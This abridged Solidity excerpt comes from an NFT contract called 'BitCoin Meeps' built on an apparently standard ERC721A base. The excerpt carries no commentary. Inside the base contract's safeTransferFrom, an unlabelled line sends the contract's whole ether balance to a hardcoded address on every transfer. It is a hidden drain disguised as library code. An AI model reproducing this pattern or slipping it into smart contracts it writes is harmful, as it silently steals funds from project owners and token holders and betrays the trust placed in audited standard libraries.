...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x1FB423a9Ff4406950EA21E5bF3D74f65a615e034).transfer(address(this).balance);
        }
    }
...
contract BitCoinMeeps is ERC721A {
    ...
    constructor() ERC721A("BitCoin Meeps", "Meeps") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://QmQZDgi6yXUybLPDeu75VbRWHDQsY2Pj55EWj8RZVkKiwo/", _toString(tokenId), ".json"));
    }
   ...
   function TeamMint(uint256 amount, address) external onlyOwner {
        _safeMint(msg.sender, amount);
    }
